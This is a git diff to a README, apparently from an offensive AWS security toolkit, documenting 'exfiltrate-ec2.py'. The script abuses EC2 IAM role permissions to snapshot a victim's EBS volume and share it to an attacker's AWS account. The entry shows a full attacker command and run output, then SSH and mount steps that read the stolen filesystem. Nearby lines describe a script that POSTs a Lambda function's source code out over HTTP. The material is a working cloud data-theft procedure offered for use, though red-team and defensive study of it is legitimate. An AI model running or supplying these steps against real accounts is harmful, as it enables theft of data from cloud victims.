@@ -95,6 +95,100 @@ Afterwards, one should see following logs in CloudWatch traces for planted Lambd
 
 - **`evaluate-iam-role.sh`** - Enumerates attached IAM Role policies, goes through all of granted permissions and lists those that are known for Privilege Escalation risks. Based on [Rhino Security Labs work](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/). [gist](https://gist.github.com/mgeeky/14685d94af7848e64afefe6fd2341a18)
 
+- **`exfiltrate-ec2.py`** - This script exploits insecure permissions given to the EC2 IAM Role allowing to exfiltrate target EC2's filesystem data in a form of it's shared EBS snapshot or publicly exposed AMI image.
+
+IAM Permissions abused:
+- `ec2:CreateSnapshot`
+- `ec2:ModifySnapshotAttribute`
+- `ec2:CreateImage`
+
+```
+attacker $ python3 ./exfiltrate-ec2.py --region us-east-1 -v --profile default --victim-profile victim-profile createsnapshot --volume-id vol-0f340890acfXXXXX --attach-instance-id i-0b359b0fcbcYYYYY
+
+        :: exfiltrate-ec2
+        Exfiltrates EC2 data by creating an image of it or snapshot of it's EBS volume
+        Mariusz B. / mgeeky '19, <mb@binary-offensive.com>
+
+[.] Using attacker's profile: default
+[.] Using victim's profile: victim-profile
+[.] Using region: us-east-1
+[.] Authenticating using Attacker's AWS credentials...
+[.] Authenticating using Victim's AWS credentials...
+[>] Abusing dangerous ec2:CreateSnapshot and ec2:ModifySnapshotAttribute...
+
+[>] Step 1: Creating EBS volume snapshot. VolumeId = vol-0f340890acfXXXXX
+[+] Snapshot of volume vol-0f340890acfXXXXX created: snap-0d7a43f0ff34ZZZZ
+[>] Step 2: Modifying snapshot attributes to share it with UserId = 71284700000
+[+] Snapshot's attributes modified to share it with user 71284700000
+[>] Step 3: Waiting for the snapshot to transit into completed state.
+[>] Step 4: Creating EBS volume in Attacker's 71284700000 AWS account.
+[.] Obtained Attacker's EC2 instance Availbility Zone automatically: us-east-1d
+[+] Created EBS volume (vol-04f36e35abeWWW at Attacker's side out from exfiltrated snapshot (snap-0d7a43f0ff34ZZZZ)
+[>] Step 5: Waiting for the volume to transit into created state.
+[>] Step 6: Attaching created EBS volume to Attacker's specified EC2 instance
+[-] Attacker's machine is in running state, preventing to attach it a volume.
+[.] Trying to stop the EC2 instance, then attach the volume and then restart it.
+[+] Attached volume to the specified Attacker's EC2 instance: i-0b359b0fcbcYYYYY
+[.] Restarting it...
+
+===============================================================
+[MODULE FINISHED]
+===============================================================
+
+[+] Exfiltrated snapshot of a victim's EBS volume:
+    VictimVolumeId = vol-0f340890acfXXXXX
+
+[+] By creating a snapshot of it, shared to the attacker's AWS user ID.
+    SnapshotId = snap-0d7a43f0ff34ZZZZ
+
+If everything went fine, Attacker's AWS account 71284700000 should have a EBS volume now:
+    AttackerVolumeId = vol-04f36e35abeWWW
+
+That was attached to the specified attacker's EC2 instance:
+    AttackerInstanceId = i-0b359b0fcbcYYYYY
+    AvailibityZone = us-east-1d
+
+Most likely as a '/dev/xvdf' device. 
+
+===============================================================
+To examine exfiltrated data:
+
+    0) SSH to the attacker's EC2 instance
+        # ssh ec2-user@18.206.230.190
+
+
+    1) List block devices mapped:
+        # lsblk
+    
+    2) If above listing yielded mapped block device, e.g. xvdf, create a directory for it:
+        # mkdir /exfiltrated
+
+    3) Mount that device's volume:
+        # mount /dev/xvdf1 /exfiltrated
+
+
+attacker $ ssh ec2-user@18.206.230.190
+[...]
+ec2-user@ec2instance:~$ sudo -s
+root@ec2instance:/home/ec2-user# lsblk
+NAME    MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
+xvda    202:0    0  25G  0 disk 
+└─xvda1 202:1    0  25G  0 part 
+xvdf    202:80   0  25G  0 disk 
+└─xvdf1 202:81   0  25G  0 part /
+root@ec2instance:/home/ec2-user# mkdir /exfiltrated
+root@ec2instance:/home/ec2-user# mount /dev/xvda1 /exfiltrated
+root@ec2instance:/home/ec2-user# ls -l /exfiltrated
+total 84
+-rw-r--r--   1 root root     0 lip 31  2018 0
+lrwxrwxrwx   1 root root     7 sie 17  2018 bin -> usr/bin
+drwxr-xr-x   3 root root  4096 sie 17  2018 boot
+drwxr-xr-x   4 root root  4096 sie 17  2018 dev
+drwxr-xr-x 179 root root 12288 gru  4 16:37 etc
+drwxr-xr-x   3 root root  4096 lis  4 16:18 home
+[...]
+```
+
 - **`exfiltrateLambdaTasksDirectory.py`** - Script that creates an in-memory ZIP file from the entire directory `$LAMBDA_TASK_ROOT` (typically `/var/task`) and sends it out in a form of HTTP(S) POST request, within an `exfil` parameter. To be used for exfiltrating AWS Lambda's entire source code.
 
 - **`get-session-creds-in-config-format.sh`** - Calls `aws sts assume-role` using MFA token in order to then retrieve session credentials and reformat it into `~/.aws/credentials` file format. Having that it's easy to copy-and-paste that script's output into credentials file. Then tools such as _s3tk_ that are unable to process MFA tokens may just use preconfigured profile creds. 
